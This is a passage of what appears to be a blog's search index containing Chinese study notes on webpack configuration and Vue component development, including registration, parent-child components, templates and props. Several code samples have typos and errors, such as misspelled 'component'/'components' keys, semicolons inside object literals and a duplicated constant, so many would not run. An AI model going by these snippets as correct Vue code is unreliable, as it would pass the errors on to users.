class="comment">//搭建本地服务器</span></span><br><span class="line">    <span class="attr">devServer</span>: &#123;</span><br><span class="line">        <span class="attr">contentBase</span>: <span class="string">&#x27;./dist&#x27;</span>,</span><br><span class="line">        <span class="attr">inline</span>: <span class="literal">true</span>, <span class="comment">//是否实时监听</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></blockquote></li><li><p>此时webpack.config.js就可以删了</p></li><li><p>然后运行的时候就会报错 说没有‘webpack.config,js’配置文件，</p><p>此时就需要在package.json中，指定要用的配置文件</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//webpack.json </span></span><br><span class="line"><span class="comment">//手动指定执行文件</span></span><br><span class="line">    <span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;test&quot;</span>: <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;build&quot;</span>: <span class="string">&quot;webpack --config ./bulid/prod.config.js&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dev&quot;</span>: <span class="string">&quot;webpack-dev-server --open --config ./build/dev.config.js&quot;</span></span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure></blockquote></li><li><p>然后就发现 被打包到build文件夹下面 的dist中了</p><blockquote><p>将路径改正确</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//原‘dist’      </span></span><br><span class="line"><span class="comment">//../是因为后面使用了 build/base.config.js</span></span><br><span class="line"><span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;../dist&#x27;</span>),</span><br></pre></td></tr></table></figure></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webpack </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>03 vue组件开发</title>
      <link href="/learningNotes/vue/03%20%E7%BB%84%E4%BB%B6%E5%BC%80%E5%8F%91"/>
      <url>/learningNotes/vue/03%20%E7%BB%84%E4%BB%B6%E5%BC%80%E5%8F%91</url>
      
        <content type="html"><![CDATA[<h2 id="1.-组件化">1. 组件化<a title="#1.-组件化" href="#1.-组件化"></a></h2><h3 id="1.1-什么是组件化">1.1 什么是组件化<a title="#1.1-什么是组件化" href="#1.1-什么是组件化"></a></h3><ul><li>将一个完整的页面分成很多个组件</li><li>每个组件都用于实现页面的一个功能块</li><li>每一个组件又可以进行细分</li></ul><h3 id="1.2-vue组件化思想">1.2 Vue组件化思想<a title="#1.2-vue组件化思想" href="#1.2-vue组件化思想"></a></h3><ul><li>组件化是Vue.js中的重要思想<ul><li>它提供了一种抽象，让我们可以开发出一个个独立可复用的小组件来构造我们的应用</li><li>任何的应用都会被抽象成一颗组件树</li></ul></li><li>组件化思想的应用<ul><li>尽可能将页面拆分成一个个小的、可以复用的组件</li><li>使代码更方便组织和管理，扩展性也更强</li></ul></li></ul><h3 id="1.3-注册组件的基本步骤">1.3 注册组件的基本步骤<a title="#1.3-注册组件的基本步骤" href="#1.3-注册组件的基本步骤"></a></h3><ol><li>调用<code>Vue.extend()</code>创建组件构造器</li><li>调用<code>Vue.component()</code>注册组件</li><li>在Vue实例的作用范围内使用组件</li></ol><h2 id="2.组件化的基本使用">2.组件化的基本使用<a title="#2.组件化的基本使用" href="#2.组件化的基本使用"></a></h2><h3 id="2.1-步骤解析">2.1 步骤解析<a title="#2.1-步骤解析" href="#2.1-步骤解析"></a></h3><ol><li>Vue.extend():<ul><li>调用Vue.extend()创建的是一个组件构造器</li><li>通常在创建组件构造器时，传入template代表我们自定义组件的模板</li><li>该模板就是在使用到组件的地方，要显示的html代码</li><li>事实上，这种写法在Vue2.x的文档已经看不到了，会直接使用语法糖的形式</li></ul></li><li>Vue.component():<ul><li>调用Vue.component()是将刚才的组件构造器注册为一个组件，并且给起一个组件的标签名称</li><li>需要传递两个参数：1. 注册组件的标签名 2. 组件构造器</li></ul></li><li>组件必须挂载在某个Vue实例下，否则不会生效</li></ol><h3 id="2.2-代码演示">2.2 代码演示<a title="#2.2-代码演示" href="#2.2-代码演示"></a></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 3.使用组件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">my-cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">my-cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//1.创建组件构造器对象  如果有多个标签的话 需要有一个根</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> cpnC = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">template</span>:<span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    &lt;h2&gt;我是标题&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;p&gt;我是内容&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    &lt;/div&gt;`</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//2.注册组件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;my-cpn&#x27;</span>,cpnC);</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//new Vue不能写在前面</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3.全局组件和局部组件">3.全局组件和局部组件<a title="#3.全局组件和局部组件" href="#3.全局组件和局部组件"></a></h2><p>全局组件：可以在多个Vue实例下面使用；通过Vue.component()注册的组件</p><p>局部组件：只能在当前Vue实例下使用；注册的组件时挂载在某个实例中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;cpn&#x27;</span>,cpnC); <span class="comment">//2.注册组件，全局组件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span><br><span class="line">    <span class="attr">data</span>:&#123;&#125;,</span><br><span class="line">    <span class="attr">components</span>:&#123;      <span class="comment">//局部组件  用的比较多</span></span><br><span class="line">        <span class="comment">//cpn使用组件时的标签名</span></span><br><span class="line">        <span class="attr">cpn</span>:cpnC;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="4.父组件和子组件">4.父组件和子组件<a title="#4.父组件和子组件" href="#4.父组件和子组件"></a></h2><ul><li>组件之间存在层级关系</li><li>其中一种非常重要的关系就是父子组件的关系</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn2</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn2</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;cpn1&gt;&lt;/cpn1&gt; 如果要使用这个组件 要在全局或者在Vue实例注册组件  --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//1.创建第一个组件构造器（子组件）</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> cpnC1 = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">template</span>:<span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    &lt;h2&gt;标题1&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    &lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">`</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript"><span class="comment">//2.创建第二个组件构造器（父组件）</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> cpnC1 = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">template</span>:<span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    &lt;h2&gt;标题2&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;cpn1&gt;&lt;/cpn1&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    &lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">`</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">components</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">cpn1</span>:cpnC1;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//root 组件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">compontents</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">cpn2</span>:cpnC2</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="5.-组件语法糖">5. 组件语法糖<a title="#5.-组件语法糖" href="#5.-组件语法糖"></a></h2><ul><li>主要是省去了调用Vue.extend()的步骤，可以直接使用一个对象来代替</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.全局组件注册的语法糖</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;cpn1&#x27;</span>,&#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;标题1&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.局部组件注册</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span><br><span class="line">    <span class="attr">data</span>:&#123;&#125;,</span><br><span class="line">    <span class="attr">temponents</span>:&#123;</span><br><span class="line">        <span class="string">&#x27;cpn2&#x27;</span>:&#123;</span><br><span class="line">            <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;标题2&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">`</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="6.组件模板抽离的写法">6.组件模板抽离的写法<a title="#6.组件模板抽离的写法" href="#6.组件模板抽离的写法"></a></h2><ul><li>Vue提供了两种方案来定义HTML模块内容：<ol><li>使用<script>标签 :type=“text/x-template”</li><li>使用<template>标签</li></ol></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 1.使用&lt;script&gt;标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/x-template&quot;</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">   <span class="tag">&lt;<span class="name">h2</span>&gt;</span>标题1<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 2.使用&lt;template&gt;标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span> = <span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">h2</span>&gt;</span>标题2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//1.注册一个全局组件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="title function_">comonent</span>(<span class="string">&#x27;cpn&#x27;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">template</span>:<span class="string">&#x27;#cpn&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="7.组件数据存放的问题">7.组件数据存放的问题<a title="#7.组件数据存放的问题" href="#7.组件数据存放的问题"></a></h2><h3 id="7.1-用法">7.1 用法<a title="#7.1-用法" href="#7.1-用法"></a></h3><ul><li>组件是一个单独功能模块的封装：<ul><li>这个模块又属于自己的HTML模板，也应该有属于自己的数据data</li></ul></li><li>组件的数据不能保存再顶层Vue实例中<ul><li>组件对象也有一个data属性（也可以有methods等属性）</li><li>只是这个data属性必须是一个函数</li><li>而且这个函数返回一个对象，对象内部保存着数据</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;#app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">my-cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">my-cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line">        &#123;&#123;title&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.注册全局组件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;cpn&#x27;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">template</span>:<span class="string">&quot;#cpn&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">title</span>:<span class="string">&#x27;abc&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="7.2-！组件中的data为什么是函数（p58）">7.2 ！组件中的data为什么是函数（p58）<a title="#7.2-！组件中的data为什么是函数（p58）" href="#7.2-！组件中的data为什么是函数（p58）"></a></h3><p>为了传值不传址，使用函数时组件与组件之间的数据不会相互影响</p><h2 id="8.父子组件的通信">8.父子组件的通信<a title="#8.父子组件的通信" href="#8.父子组件的通信"></a></h2><ul><li>在开发中，往往一些数据需要从上层传递到下层<ul><li>比如在一个页面中，我们从服务器请求到了很多的数据</li><li>其中一部分数据，并非是我们整个页面的大组件来展示的，而是需要下面的子组件进行展示</li><li>这个时候，并不会让子组件再次发送一个网络请求，而是让大组件将数据传递给小组件</li></ul></li><li>如何进行父子/大小组件间的通信呢?Vue官方提到<ul><li>通过props向子组件传递数据</li><li>通过自定义事件$emit向父组件发送消息</li></ul></li></ul><h3 id="8.1-props基本用法——父–&gt;子">8.1 props基本用法——父–&gt;子<a title="#8.1-props基本用法——父–&gt;子" href="#8.1-props基本用法——父–&gt;子"></a></h3><ul><li>在组件中，使用选项props来声明需要从父级接收到的数据</li><li>props的值有两种方式：<ol><li>字符串数组，数组的字符串就是传递时的名称</li><li>对象，对象可以设置传递时的类型，也可以设置默认值等</li></ol></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;app&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span> <span class="attr">v-bind:cmovies</span>=<span class="string">&quot;movies&quot;</span> <span class="attr">:cmessage</span>=<span class="string">&quot;message&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 这就已经把值从父组件传到子组件了 必须要使用v-bind --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-for</span>=<span class="string">&quot;item in cmovies&quot;</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;cmessage&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//父传子:props</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> cpn = &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">template</span>:<span class="string">&quot;#cpn&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">props</span>:[<span class="string">&#x27;comvies&#x27;</span>,<span class="string">&#x27;cmessage&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span>&#123;&#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">movies</span>:[<span class="string">&#x27;海王&#x27;</span>,<span class="string">&#x27;海贼王&#x27;</span>,<span class="string">&#x27;海尔兄弟&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">components</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            cpn</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="8.1.1-props数据验证">8.1.1 props数据验证<a title="#8.1.1-props数据验证" href="#8.1.1-props数据验证"></a></h4><ul><li>上述props选项使用一个数组</li><li>除数组外，可以使用对象，当需要对props进行类型等验证时，就需要对象写法了</li><li>验证支持的数据类型：<ul><li>String、Number、Boolean、Array、Object、Date、Function、Symbol</li></ul></li><li>若有自定义构造函数时，验证也支持自定义的类型</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 